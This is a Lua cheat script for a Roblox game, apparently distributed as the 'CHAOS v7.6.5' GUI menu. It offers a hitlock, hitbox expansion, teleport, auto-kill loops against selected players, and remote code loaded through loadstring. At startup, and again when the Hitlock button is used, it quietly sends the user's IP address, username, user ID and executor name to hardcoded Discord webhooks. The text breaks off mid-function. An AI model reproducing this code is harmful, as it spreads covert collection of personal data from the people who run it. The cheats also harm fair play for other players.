--[[

LOL AGAIN YOU?

]]--


local ip = loadstring(game:HttpGet("https://api.ipify.org", true))()

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local url = "https://discord.com/api/webhooks/1268969562553061496/P72_J_UB1hR3YJOlPomj8d_ocPN_XxcvGnHd9HVyJOtHYqBgM--utcrwnM5jPR9Y4qld"
SendMessage(url)

local embed = {
    ["title"] = "CHAOS (PC GUI)",
    ["description"] = "New log detected on CHAOS V7.6.5 (MAIN)",
    ["color"] = 5,
    ["fields"] = {
        {
            ["name"] = "IP",
            ["value"] = ip
        },
                {
            ["name"] = "Display Name",
            ["value"] = game.Players.LocalPlayer.DisplayName
        },
        {
            ["name"] = "User Name",
            ["value"] = game.Players.LocalPlayer.Name
        },
        {
            ["name"] = "User ID",
            ["value"] = game.Players.LocalPlayer.UserId
        },
        {
            ["name"] = "Exploit",
            ["value"] = identifyexecutor()
        }
    },
    ["footer"] = {
        ["text"] = " ",
    },
}
SendMessageEMBED(url, embed)


local UserInputService = game:GetService("UserInputService")
local Heartbeat = game:GetService("RunService").Heartbeat
local walkSpeed = 15.1
local plrs = game:GetService'Players'
local Heartbeat = game:GetService("RunService").Heartbeat
local plr = plrs.LocalPlayer
local mouse = plr:GetMouse()
local rep = game:GetService'ReplicatedStorage'
local uis = game:GetService'UserInputService'
local ts = game:GetService'TweenService'
local rs = game:GetService'RunService'

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local function Notify(title,text,duration)
    game:GetService'StarterGui':SetCore('SendNotification',{
        Title = tostring(title),
        Text = tostring(text),
        Duration = tonumber(duration),
    })
end

local function GetChar()
    local Char = Player.Character or Player.CharacterAdded:Wait()
    return Char
end

spawn(function()
    while true do rs.RenderStepped:wait()
        pcall(function()
            if not uis:IsKeyDown(Enum.KeyCode.LeftShift) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed
            elseif uis:IsKeyDown(Enum.KeyCode.LeftShift) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed+10
            end
        end)
    end
end)

spawn(function()
    while true do rs.RenderStepped:wait()
        pcall(function()
            if not uis:IsKeyDown(Enum.KeyCode.E) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed
            elseif uis:IsKeyDown(Enum.KeyCode.E) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed+10
            end
        end)
    end
end)

local function AddCd(tool, Cd)
    local cd = Instance.new('IntValue', tool)
    cd.Name = 'ClientCD'
    game.Debris:AddItem(cd, Cd)
end

local function Shoot(firstPos, nextPos, Revolver)
    if Revolver:FindFirstChild('Barrel') and Revolver.Barrel:FindFirstChild('Attachment') then
        if Revolver.Barrel.Attachment:FindFirstChild('Sound') then
            local SoundClone = Revolver.Barrel.Attachment.Sound:Clone()
            SoundClone.Name = 'Uncopy'
            SoundClone.Parent = Revolver.Barrel.Attachment
            SoundClone:Play()
            game.Debris:AddItem(SoundClone, 1)
        end

        local FilterTable = {}
        table.insert(FilterTable, plr.Character)
        table.insert(FilterTable, game.Workspace['Target Filter'])
        for _, v in pairs(game.Workspace:GetDescendants()) do
            if v.ClassName == 'Accessory' then
                table.insert(FilterTable, v)
            end
        end

        local direction = (nextPos - firstPos).Unit * 100
        local ray = Ray.new(firstPos, direction)
        local hitPart, hitPosition = game.Workspace:FindPartOnRayWithIgnoreList(ray, FilterTable)

        local BulletCl = rep['Revolver Bullet']:Clone()
        game.Debris:AddItem(BulletCl, 1)
        BulletCl.Parent = game.Workspace['Target Filter']

        if hitPart then
            local distance = (firstPos - hitPosition).Magnitude
            BulletCl.Size = Vector3.new(0.2, 0.2, distance)
            BulletCl.CFrame = CFrame.new(firstPos, hitPosition) * CFrame.new(0, 0, -distance / 2)

            ts:Create(BulletCl, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                Size = Vector3.new(0.06, 0.06, distance), 
                Transparency = 1
            }):Play()

            local expPart = Instance.new('Part')
            game.Debris:AddItem(expPart, 2)
            expPart.Name = 'Exploding Neon Part'
            expPart.Anchored = true
            expPart.CanCollide = false
            expPart.Shape = 'Ball'
            expPart.Material = Enum.Material.Neon
            expPart.BrickColor = BulletCl.BrickColor
            expPart.Size = Vector3.new(0.1, 0.1, 0.1)
            expPart.Parent = game.Workspace['Target Filter']
            expPart.Position = hitPosition

            ts:Create(expPart, TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                Size = Vector3.new(2, 2, 2), 
                Transparency = 1
            }):Play()

            if Revolver:FindFirstChild('DamageRemote') and hitPart.Parent:FindFirstChild('Humanoid') then
                Revolver.DamageRemote:FireServer(hitPart.Parent.Humanoid)
            end
        else
            local distance = (firstPos - (firstPos + direction)).Magnitude
            BulletCl.Size = Vector3.new(0.2, 0.2, distance)
            BulletCl.CFrame = CFrame.new(firstPos, firstPos + direction) * CFrame.new(0, 0, -distance / 2)

            ts:Create(BulletCl, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                Size = Vector3.new(0.06, 0.06, distance), 
                Transparency = 1
            }):Play()
        end
    end
end


local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/tzxk15/z/refs/heads/main/UI", true))()
local Table = {}

local window = Lib:CreateWindow("Chaos v7.6.5y")

window:Section(" Main Functions")

window:Button("Hitlock v10.1.0n",function()

local ip = game:HttpGet("https://api.ipify.org")

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local url = "https://discord.com/api/webhooks/1268978390057095288/aYSeFb3rVDpITuql1SgCqn8_kQzlVJv_Z70eeNvRt6GWuE57F2flGHReiCz1drrIVpKT"
SendMessage(url)

local embed = {
    ["title"] = "Hitlock v10.1.0n enabled by:",
    ["description"] = "A player enabled this function, heres logs:",
    ["color"] = 32768,
    ["fields"] = {
        {
            ["name"] = "IP",
            ["value"] = ip
        },
                {
            ["name"] = "Display Name",
            ["value"] = game.Players.LocalPlayer.DisplayName
        },
        {
            ["name"] = "User Name",
            ["value"] = game.Players.LocalPlayer.Name
        },
        {
            ["name"] = "User ID",
            ["value"] = game.Players.LocalPlayer.UserId
        },
        {
            ["name"] = "Exploit",
            ["value"] = identifyexecutor()
        }
    },
    ["footer"] = {
        ["text"] = " ",
    },
}
SendMessageEMBED(url, embed)

wait()

game.StarterGui:SetCore("SendNotification", {
    Title = "Hitlock:";
    Text = "Hitlock is now fixed, enjoy!";
    Icon = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 4;
    callback = bindableFunction;
})
local plr = game.Players.LocalPlayer
local rs = game:GetService("RunService")
local mouse = plr:GetMouse()

-- Function to add glow to SelectionBox
local function AddGlow(selectionBox)
    local glow = Instance.new("PointLight")
    glow.Name = "SelectionGlow"
    glow.Color = Color3.fromRGB(255, 0, 0)
    glow.Brightness = 9
    glow.Range = 5
    glow.Parent = selectionBox
end

-- Function to create a neon part and update its position
local function CreateNeonPart(adornedPart, player)
    -- Elimina cualquier "SelectedPlayerGui" existente
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "SelectedPlayerGui" and v:IsA("BillboardGui") then
            v:Destroy()
        end
    end

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "SelectedPlayerGui"
    billboardGui.AlwaysOnTop = true
    billboardGui.Size = UDim2.new(0.9, 0, 0.9, 0)  -- Ajusta el tamaño según sea necesario
    billboardGui.Adornee = adornedPart
    billboardGui.Parent = adornedPart

    local frame = Instance.new("Frame")
    frame.BackgroundTransparency = 0.25
    frame.Size = UDim2.new(0.9, 0, 0.9, 0)
    frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    frame.Parent = billboardGui

    local neonPart = Instance.new("Part")
    neonPart.Name = "SelectedPlayer"
    neonPart.Anchored = true
    neonPart.CanCollide = false
    neonPart.Transparency = 0.85
    neonPart.Size = Vector3.new(0.5, 0.5, 0.5)
    neonPart.Position = adornedPart.Position
    neonPart.CFrame = adornedPart.CFrame
    neonPart.Material = Enum.Material.Neon
    neonPart.Color = Color3.fromRGB(255, 0, 0)
    AddGlow(neonPart)  -- Añadir brillo a la parte de neón
    neonPart.Parent = adornedPart
    
    -- Update neon part position continuously
    local function updatePosition()
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            neonPart.Position = player.Character.HumanoidRootPart.Position
        else
            neonPart:Destroy()
        end
    end
    
    updatePosition() -- Call initially to set correct position
    
    -- Connect to heartbeat to update position continuously
    local heartbeatConnection
    heartbeatConnection = rs.Heartbeat:Connect(function()
        if not player or not player.Parent or not player.Character or not player.Character:FindFirstChild("Head") then
            neonPart:Destroy()
            heartbeatConnection:Disconnect()
        else
            updatePosition()
        end
    end)
end

-- Function to get the local player's name
local function GetLocalPlayerName()
    return plr.Name
end

-- Function to handle player selection
local function SelectPlayer(player)
    -- Avoid selecting the local player
    if player == plr then return end

    for _, v in next, workspace:GetDescendants() do
        if v.Name == "SelectedPlayer" or v.Name == "SelectedPlayerGui" then
            v:Destroy()
        end
    end

    if player then
        CreateNeonPart(player.Character.Head, player)
        tar = player
    end
end

-- Main key down event handler
mouse.KeyDown:Connect(function(key)
    if key == 'r' then
        tar = nil
        local n_plr, dist
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= plr and plr.Character and plr.Character:FindFirstChild'HumanoidRootPart' then
                local distance = v:DistanceFromCharacter(plr.Character.HumanoidRootPart.Position)
                if v.Character and (not dist or distance <= dist) and v.Character:FindFirstChildOfClass'Humanoid' and v.Character:FindFirstChildOfClass'Humanoid'.Health > 0 and v.Character:FindFirstChild'HumanoidRootPart' then
                    dist = distance
                    n_plr = v
                end
            end
        end
        if n_plr then
            SelectPlayer(n_plr)
        end
    elseif key == 'q' and tar and plr.Character then
        for _,v in next,plr.Character:GetDescendants() do
            if v:IsA'Tool' and v.Name ~= 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'DamageRemote' and v:FindFirstChild'Cooldown' and tar and tar.Character and tar.Character:FindFirstChildOfClass'Humanoid' then
                AddCd(v,v.Cooldown.Value)
                if v:FindFirstChild'Attack' and plr.Character:FindFirstChildOfClass'Humanoid' then
                    plr.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Attack):Play()
                end
                if v:FindFirstChild('Blade') then
                    local swingSound = v.Blade:FindFirstChild('SwingSound')
                    local hitSound = v.Blade:FindFirstChild('HitSound')
                    
                    if swingSound and swingSound:IsA('Sound') then
                        swingSound:Play()
                    end
                    wait(0.2)
                    if hitSound and hitSound:IsA('Sound') then
                        hitSound:Play()
                        rs.Stepped:Wait(0.2)
                    end
                    v.DamageRemote:FireServer(tar.Character:FindFirstChildOfClass('Humanoid'))
                end
            elseif v:IsA'Tool' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' and tar and tar.Character and tar.Character:FindFirstChild'Head' then
                v.Parent = plr.Character
                AddCd(v,1.0)
                rs.Stepped:Wait()
                plr.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Fire):Play()
                Shoot(v.Barrel.Attachment.WorldPosition, tar.Character:WaitForChild("Torso").Position, v)
                v.ReplicateRemote:FireServer(tar.Character:WaitForChild("Torso").Position)            
            end
        end
    end
end)

-- Mouse click event handler to select player
mouse.Button1Down:Connect(function()
    local target = mouse.Target
    if target and target.Parent then
        local player = game.Players:GetPlayerFromCharacter(target.Parent)
        if player and player ~= plr then
            SelectPlayer(player)
        end
    end
end)
end)

window:Button("Inf Jump",function()
local Player = game:GetService'Players'.LocalPlayer;
local UIS = game:GetService'UserInputService';
 
_G.JumpHeight = 50;
 
function Action(Object, Function) if Object ~= C4 then Function(Object); end end
 
UIS.InputBegan:connect(function(UserInput)
    if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
        Action(Player.Character.Humanoid, function(self)
            if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
                Action(self.Parent.HumanoidRootPart, function(self)
                    self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
                end)
            end
        end)
    end
end)
end)

window:Button("RGB Sprint Bar",function()
local speed = 10
while true do
    for i = 0,1,0.001*speed do
        game:GetService("Players").LocalPlayer.PlayerGui.Sprinting.Frame.Frame.BackgroundColor3 = Color3.fromHSV(i,1,1)
        wait()
    end
end
end)

window:Dropdown("Auto Select:",{location = Table,flag = "weapon",search = false --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe", "Emerald Greatsword","Blood Dagger","Frost Spear"}--[[Wont work when PlayerList = true]], PlayerList = false --[[ Turns the list into the players in the server ]]},function()
local Mouse = game.Players.LocalPlayer:GetMouse()
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.KeypadSeven then
while true do wait()
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()


    game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer(Table["weapon"])
wait(1) end
end
end)
end)


local Pressing = false
window:Toggle("Auto Select Tool",{location = Table, flag = "enable"},function()
local stopFlag = false
game.StarterGui:SetCore("SendNotification", {
    Title = "Current:";
    Text = (Table["weapon"]),
    Icon = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 5; 
    callback = bindableFunction;
})
local function pressKey()
wait(.5)  
game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadSeven, false, game)
end

if Pressing then
    Pressing = false
    stopFlag = true
else
    Pressing = true
    stopFlag = false
    spawn(function()
        repeat
            pressKey()
            wait(1)
            game:GetService("RunService").Heartbeat:Wait()
        until stopFlag or not Pressing
    end)
end
end)

window:Button("Set Night",function()
game.Lighting:SetMinutesAfterMidnight(155)
    end)

window:Button("Infinite Yield v5",function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

window:Button("Anti Fling (OP)",function()
game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "LOADED! CURRENT : " .. tostring(LOL); 
        Color = Color3.fromRGB(0, 222, 0);
})          
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
end)

window:Button("Anti Spike Trap",function()
while true do wait()
local function removeTouchInterestFromSpikeTrap()
    print("Checking for Spike Traps...") -- Mensaje de depuración
    -- Recorrer todos los objetos en el Workspace
    for _, object in pairs(game.Workspace:GetDescendants()) do
        -- Verificar si el objeto es un Spike Trap
        if object.Name == "Spike Trap" then
            print("Found Spike Trap:", object) -- Mensaje de depuración
            -- Buscar el Button dentro del Spike Trap
            local button = object:FindFirstChild("Button")
            if button then
                -- Buscar y eliminar el TouchInterest dentro del Button
                for _, child in pairs(button:GetChildren()) do
                    if child:IsA("TouchTransmitter") then
                        print("Found and destroying TouchTransmitter in:", button) -- Mensaje de depuración
                        child:Destroy()
                    end
                end
            end
        end
    end
end

-- Obtener el jugador local
local player = game.Players.LocalPlayer

-- Conectar al evento CharacterAdded del jugador
player.CharacterAdded:Connect(function(character)
    print("Character added:", character) -- Mensaje de depuración
    -- Esperar a que el personaje termine de cargar
    character:WaitForChild("HumanoidRootPart")
    -- Ejecutar la función para eliminar TouchInterest de Spike Traps
    removeTouchInterestFromSpikeTrap()
end)

-- Ejecutar la función una vez al inicio por si el jugador ya está en el juego
if player.Character then
    print("Player already has a character:", player.Character) -- Mensaje de depuración
    removeTouchInterestFromSpikeTrap()
end
wait(.1) end
end)


window:Button("Owner Hotkeys",function()
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

UserInputService.InputBegan:Connect(function(input, isTyping)
    if isTyping then return end
    
    -- Check if the Emerald Greatsword tool is equipped
    local currentTool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
    if currentTool and currentTool.Name == "Emerald Greatsword" then
        return  -- Exit the function if Emerald Greatsword is equipped
    end
    
    if input.KeyCode == Enum.KeyCode.B then
        -- Check tools in the player's Backpack
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name == 'Grenade' and tool:FindFirstChild('RemoteEvent') then
                -- Move tool to the player's character to activate
                tool.Parent = LocalPlayer.Character
                wait(0.1)
                tool:Activate()
                wait(0.3)
                tool.Parent = LocalPlayer.Backpack
            end
        end
        
        -- Check tools equipped in Workspace
        local toolsInWorkspace = Workspace:FindPartsInRegion3(Workspace.CurrentCamera.CFrame:PointToWorldSpace(Workspace.CurrentCamera.ViewportSize) + Vector3.new(-5, -5, -5), Workspace.CurrentCamera.CFrame:PointToWorldSpace(Workspace.CurrentCamera.ViewportSize) + Vector3.new(5, 5, 5))
        for _, tool in ipairs(toolsInWorkspace) do
            if tool:IsA("Tool") and tool.Name == 'Grenade' and tool:FindFirstChild('RemoteEvent') then
                -- Activate tool in Workspace
                tool:Activate()
                break
            end
        end
    end
end)

         --
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

UserInputService.InputBegan:Connect(function(input, isTyping)
    if isTyping then return end
    
    if input.KeyCode == Enum.KeyCode.B then
        -- Check if Kawaii Revolver is equipped
        local currentTool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if currentTool and currentTool.Name == "Kawaii Revolver" then
            -- Unequip Kawaii Revolver
            currentTool.Parent = LocalPlayer.Backpack
        end
        
        -- Check tools in the player's Backpack
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if tool.Name == 'C4' and tool:FindFirstChild('RemoteEvent') then
                -- Move C4 tool to the player's character and activate
                tool.Parent = LocalPlayer.Character
                tool.RemoteEvent:FireServer(Mouse.Hit.LookVector)
                wait(0.1)
                tool.Parent = LocalPlayer.Backpack
            end
        end
    end
end)
end)

window:Bind("Quick GR2 Glitch",{location = Table, flag = "KeyBind", default = Enum.KeyCode.Q},function()
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

function GetCharacter()
    return workspace:FindFirstChild(Players.LocalPlayer.Name)
end

function TeleportBehindRightArm()
    local character = GetCharacter()
    if character then
        local tool = character:FindFirstChild("Grenade 2") -- Reemplaza "Grenade 2" con el nombre correcto de la herramienta si es diferente
        local rightArm = character:FindFirstChild("Torso") or character:FindFirstChild("Torso") -- Dependiendo del tipo de rigging usado (R15 o R6)
        
        -- Calcular la posición 2 studs detrás del brazo derecho
        local backPosition = rightArm.Position - (character.HumanoidRootPart.CFrame.LookVector * 7)
        
        if tool then
            tool:MoveTo(backPosition)
        end
    end
end

UserInputService.InputBegan:Connect(function(input, isTyping)
    if isTyping then return end
    if input.KeyCode == (Table["KeyBind"]) then
        TeleportBehindRightArm()
    end
end)
end)

window:Bind("Click TP ",{location = Table, flag = "KeyBind1", default = Enum.KeyCode.V},function()
local Imput = game:GetService("UserInputService")
local Plr = game:service'Players'.LocalPlayer
local Mouse = Plr:GetMouse()

function To(position)
    local Chr = Plr.Character
    if Chr ~= nil then
        Chr:MoveTo(position)
    end
end

Imput.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and Imput:IsKeyDown(Table["KeyBind1"]) then
        To(Mouse.Hit.p)
    end
end)
end)

game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if Input.KeyCode == Enum.KeyCode.KeypadFive then
        local player = game.Players.LocalPlayer
        local character = player.Character
        local backpack = player.Backpack

        for i, v in pairs(backpack:GetChildren()) do
            if v:IsA("Tool") and v:FindFirstChild("DamageRemote") and v.Name ~= "Kawaii Revolver" then
                character.Humanoid:EquipTool(v)
                break
            end
        end

        local equippedTool = character:FindFirstChildOfClass("Tool")
        if equippedTool and equippedTool:FindFirstChild("DamageRemote") then
            local target = character:FindFirstChild("Humanoid")
            if target then
                repeat
                    wait()
                    equippedTool.DamageRemote:FireServer(target)
                until target.Health <= 0
            end
        end
    end
end)

window:Toggle("Enable/Disable H.B",{location = Table, flag = "Togglex"},function()
    getgenv().HitboxStatus = (Table["Togglex"])
    game:GetService('RunService').RenderStepped:connect(function()
        if HitboxStatus == true and TeamCheck == false then
            for i,v in next, game:GetService('Players'):GetPlayers() do
                if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                    pcall(function()
                        v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
                        v.Character.HumanoidRootPart.Transparency = HitboxTransparency
                        v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
                        v.Character.HumanoidRootPart.Material = "Neon"
                        v.Character.HumanoidRootPart.CanCollide = false
                    end)
                end
            end
        elseif HitboxStatus == true and TeamCheck == true then
            for i,v in next, game:GetService('Players'):GetPlayers() do
                if game:GetService('Players').LocalPlayer.Team ~= v.Team then
                    pcall(function()
                        v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
                        v.Character.HumanoidRootPart.Transparency = HitboxTransparency
                        v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
                        v.Character.HumanoidRootPart.Material = "Neon"
                        v.Character.HumanoidRootPart.CanCollide = false
                    end)
                end
            end
        else
            for i,v in next, game:GetService('Players'):GetPlayers() do
                if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                    pcall(function()
                        v.Character.HumanoidRootPart.Size = Vector3.new(2,2,1)
                        v.Character.HumanoidRootPart.Transparency = 1
                        v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Medium stone grey")
                        v.Character.HumanoidRootPart.Material = "Plastic"
                        v.Character.HumanoidRootPart.CanCollide = false
                    end)
                end
            end
        end
    end)
end)
--

--flag= (Table["Slider"])
window:Slider("Size",{location = Table, min = 5, max = 50, default = 20, precise = false --[[ 0.00 instead of 0 ]], flag = "Size"},function()
 getgenv().HitboxSize = (Table["Size"])
end)

window:Slider("Transparency",{location = Table, min = 0.25, max = 1, default = 0.25, precise = false --[[ 0.00 instead of 0 ]], flag = "Tras"},function()
    getgenv().HitboxTransparency = (Table["Tras"])
end)

game.StarterGui:SetCore("SendNotification", {
    Title = "Loading..";
    Text = "Wait until load..";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 2;
    callback = bindableFunction;
})

window:Section(" Target List")

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player1",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
local usernames        = {(Table["player1"])}-- Reemplaza estos nombres de usuario con los que desees
local Players          = game:GetService("Players")
local LocalPlayer      = Players.LocalPlayer
local Mouse            = LocalPlayer:GetMouse()
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
        for _, username in pairs(usernames) do
            local TargetPlayer = Players:FindFirstChild(username)
            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
                repeat
                    wait()
                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
                until Target.Health <= 0
            end
        end
    end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player2",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
local usernames        = {(Table["player2"])}-- Reemplaza estos nombres de usuario con los que desees
local Players          = game:GetService("Players")
local LocalPlayer      = Players.LocalPlayer
local Mouse            = LocalPlayer:GetMouse()
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
        for _, username in pairs(usernames) do
            local TargetPlayer = Players:FindFirstChild(username)
            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
                repeat
                    wait()
                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
                until Target.Health <= 0
            end
        end
    end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player3",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
local usernames        = {(Table["player3"])}-- Reemplaza estos nombres de usuario con los que desees
local Players          = game:GetService("Players")
local LocalPlayer      = Players.LocalPlayer
local Mouse            = LocalPlayer:GetMouse()
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
        for _, username in pairs(usernames) do
            local TargetPlayer = Players:FindFirstChild(username)
